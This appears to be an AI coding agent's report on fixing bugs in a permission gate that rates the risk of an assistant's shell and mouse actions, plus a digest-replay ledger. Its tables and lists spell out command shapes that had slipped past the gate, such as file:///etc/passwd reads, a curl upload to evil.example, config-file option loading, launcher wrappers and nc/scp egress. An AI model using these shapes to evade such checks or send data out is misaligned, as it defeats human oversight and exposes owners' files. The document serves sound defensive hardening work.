# RPT-O-BUGFIX-1 — Agent O · FIX-B1 + FIX-B2/B4 execution (2026-11-26)

Executed `reports/DISPATCH-BUGFIX-1.md` FIX-B1 then FIX-B2, against
`reports/BUGHUNT-B-20261126.md`. Synced `main` before each batch.
Two merged PRs; frozen thresholds untouched; `OWNERS.yaml` untouched.

- **FIX-B1 (BUG-B1)** — PR **#151** (merged).
  `src/assistant/hands/gate.py` + `tests/test_bug_b1_gate_tier_misclassification.py`.
- **FIX-B2 (BUG-B2 + BUG-B4)** — PR **#152** (merged).
  `src/assistant/hands/queue.py`, `src/assistant/hands/runner.py`,
  `tests/test_bug_b2_mouse_digest_replay.py`,
  `tests/test_bug_b4_mouse_stale_verification.py`,
  `tests/test_o_mouse_fixture.py` (harness update only).

---

## FIX-B1 — `BUG-B1` · gate tier misclassification

`GateChecker.derive()` now classifies exec steps on **resolved semantics** —
canonicalised paths (including `argv[0]`), unwrapped launcher chains,
normalised flag parsing — defaulting to tier 3 on anything unrecognised,
never tier 2 by omission:

1. **`argv[0]` participates in `paths()`** when it is a path form: the
   candidate is canonicalised and goes through `assert_within_sandbox` and
   the credential wall. Only trusted system launchers
   (`/usr/bin/x`, `/bin/x` post-resolve) are exempt, and they are still
   name-classified. `file://` URIs, `--flag=value` values, attached short
   values (`-o/etc/passwd`) and `@file` references are extracted as path
   candidates too.
2. **Shebang check canonicalises relative paths** (`./innocent-name`,
   `sub/innocent-name` resolve against `step.cwd`); an unreadable launcher
   path is unrecognised → tier 3.
3. **Launcher chains are unwrapped**: transparent wrappers (`timeout`,
   `nice`, `nohup`, `stdbuf`, `setsid`, `watch`, `time`, `flock`, `chrt`,
   `ionice`, `taskset`, `strace`, `firejail`, `bwrap`, `bubblewrap`) are
   skipped with their option operands and the *payload* is classified
   (shell/interpreter/recursive/upload checks); privilege launchers
   (`pkexec`, `systemd-run`, `unshare`, `nsenter`, `capsh`, plus the
   existing `sudo`/`su`/`doas`/`env`/`xargs`/`busybox`/`eval`/`exec`) are
   tier 3 outright; a wrapper with no resolvable payload is tier 3. Only
   bare names and trusted system paths unwrap — a lookalike under the
   fixture tree is its own program. GNU flag parsing is normalised:
   `--recursive=always` and abbreviated `--r` are `--recursive`.
4. **Upload detection is normalised** (`--data=…`, `--data-binary`,
   `--form-string`, abbreviated longs, attached shorts `-d@x`/`-Tfile`), on
   top of the existing exact-token set (generic, unchanged).

Regression evidence: 22 `test_bug_b1_*` tests; **21 fail before the change
and all 22 pass after**. Existing gate suites unchanged and green.

## FIX-B2 — `BUG-B2` (+B4) · mouse digest replay & stale verification

**Digest claims (`queue.py`).** `mouse_claims` keys on `digest` alone
(`PRIMARY KEY (digest)`): a digest is claimable **exactly once, globally** —
the "fresh errand string" replay (`claim(e1,d,12)` → `claim(e2,d,12)`) is
dead. The 12-click budget is **per digest** (`SUM(clicks) WHERE digest=?`,
frozen 12 untouched); click counts reject `bool`/non-`int` with
`ValueError` (matching `park`/`decide`/`reserve_mock` conventions). The
claim row **binds `errand` + `created` + `expires`** (`MOUSE_CLAIM_TTL_S`),
and `claim_binds()` is enforced before every click (`stale-claim` halt) —
this is where the dispatch's "plan.digest must bind errand + expiry" is
made an enforced invariant (the binding lives in the claim ledger so
`Plan.canonical`, a frozen cross-suite contract, keeps its shape and the
evidence repro `claim(e1,"a"*64,12) → True` holds without registration).

**Runner (`runner.py`).** `run_mouse_fixture()` checks
`queue.current(errand, digest)` at entry **and again after `owner_prompt`**
(the supersede-mid-wait window) → `refused/stale-plan`. **Parked asks get
an enforced TTL** (`ASK_TTL_S`) in `decide()` and `claim()`: an expired ask
expires to `state='stale'` (so a re-park mints a fresh one — no deadlock)
and an aged-out `yes` never dispatches.

**BUG-B4.** Every capture must be a fresh frame: unique `frame_id`,
strictly increasing `captured_at` within the batch, and the post-click
verification frame must be **captured after the click it verifies**
(`captured_at >` the click moment on the batch clock). Cached/regressed
buffers halt `stale-frame` — the report's exact repro (pre `captured_at=5.0`
/ post `captured_at=1.0`, both `frame_id='same-stale-id'`, `clock()=100.0`)
went from `complete` + a verified click to `halted/stale-frame`. Click-loop
detection inspects the whole batch history (periods ≥ 4 caught; the 4-state
cycle repro halts at step 4 with exactly 4 clicks). The click is grounded on
the post-record recheck capture, not the discarded first frame.

Regression evidence: 13 `test_bug_b2_*` (fail at collection before —
`ASK_TTL_S` did not exist) + 6 `test_bug_b4_*` (5 fail before; 1 control
passes both). `tests/test_o_mouse_fixture.py` was updated to register the
errand and serve one fresh capture per observe; all 13 scenarios keep their
exact outcomes.

## Test totals

- Baseline before any fix: 3478 passed, 6 skipped.
- After both merges: **3523 passed, 6 skipped, 0 failed** (whole suite).
- Frozen thresholds untouched: 12-click budget, 90 s batch deadline,
  confidence floors, pacing, recent-guard windows.

## Notes for the manager

- The dispatch asked for "a new `arena/*` branch" per fix; Arena pins this
  session to `arena/a15792b6-elaria`, so both fixes landed as two
  sequential merged PRs from that branch (PR #151, PR #152), each with its
  own regression tests and commit.
- Interpretation call, flagged: "the 12-click budget is per-digest, not
  per-errand" is implemented literally (a new digest under the same errand
  gets its own ≤12 budget; total errand clicks are bounded by the number of
  distinct owner-approved plans, each exactly-once). If the intent was to
  keep the per-errand cap as well, say so and I will tighten it.
- `Plan.canonical`/`Plan.digest` keep hashing `{"steps": [...]}` only; the
  errand+expiry binding is enforced in the claim ledger and the runner's
  `current()` re-checks, which kills the replay repro without breaking the
  frozen canonical format shared with `errands`/bridge receipts.

---

## Follow-up round — residual shapes (2026-11-26, PR #156)

Re-verification of the merged fixes found the enumerated repros closed but
further shapes of the **same declared class** still tier 2 — exactly the
"argument shapes are unbounded … never tier 2 by omission" rule. Fixed from
`arena/89f04216-elaria` (main synced to `a654b3b` first), merged as
`a9fa8ed` (PR **#156**).

**BUG-B1 residuals (`gate.py`).**

| shape | before | after |
|---|---|---|
| `curl --url=file:///etc/passwd`, `curl -ofile:///etc/passwd` | 2 | 3 |
| `curl -K f`, `--config=f`, `--netrc-file f`, `wget -e …` | 2 | 3 |
| `curl -sd@sub/note.txt https://evil.example` (bundled upload short) | 2 | 3 |
| `wget --post-data=@f` / `--post-file` / `--body-data` / `--body-file` | 2 | 3 |
| `scp`/`sftp`/`rsync`/`ssh`/`nc`/`socat`/… to an undeclared host | 2 | 3 |

- `_as_url()`/`_urls()` parse a URI carried as another flag's value, so the
  scheme can no longer hide behind a flag prefix.
- `_option_loading()` → 3 (options loaded from a file/inline string are argv
  we never see); scoped so `-e` stays an ordinary operand for `grep`/`sed`
  (`grep -e pat f` still tier 0, unchanged from baseline).
- `_upload_shape()` scans the whole short bundle, not only `arg[1]`.
- wget body/POST flags joined `UPLOAD_FLAG_NAMES`.
- `_remote_egress()`/`_remote_host()`: `user@host:path`, `ssh://` URLs and
  bracketed IPv6 literals resolve to a host; destination outside
  `facts.owner_services` → 3, local→local → 2, a declared owner service keeps
  its ask lane.
- `paths()` also takes attached upload/output values, so `-o/etc/passwd` is
  sandbox- and credential-checked.

**BUG-B2 residual (`runner.py`).** `queue.current(errand, digest)` is now
re-checked **per step**, not only around `owner_prompt`: a plan superseded in
`errands` mid-batch halted at the next step (`halted/stale-plan`, one click
fired) instead of completing every click. The claim ledger (once-globally,
per-digest 12 budget, strict int counts, ask TTL) is untouched and frozen.

**Evidence.** +28 regressions; 21 B1 cases and the B2 mid-batch case fail on
the pre-hardening source and pass after (verified by stashing the source
change, not by assertion). hands/gate/mouse/typing slice: 552 passed,
1 skipped. Whole suite: 3497 passed, 32 skipped, 32 failed — the same 32
streaming/wire-lane failures measured on unmodified `main`
(`test_stream_g7`, `test_stream_f_wire`, `test_stream_g_primary`,
`test_stream_h_sensors`, `test_live_repro_arm_b`). Frozen thresholds
untouched; `OWNERS.yaml` untouched; no process launched, no owner path
touched.

**Flagged.** The remote-transfer rule is default-deny (no owner-declared
services → any `nc`/`scp`/`ssh` host is tier 3), while `curl`/`wget` keep
their pre-existing shape (a plain GET stays tier 2, caught by
`sends_owner_content`/`effects_complete`). Say so if the GET lanes should be
aligned or the egress set trimmed.
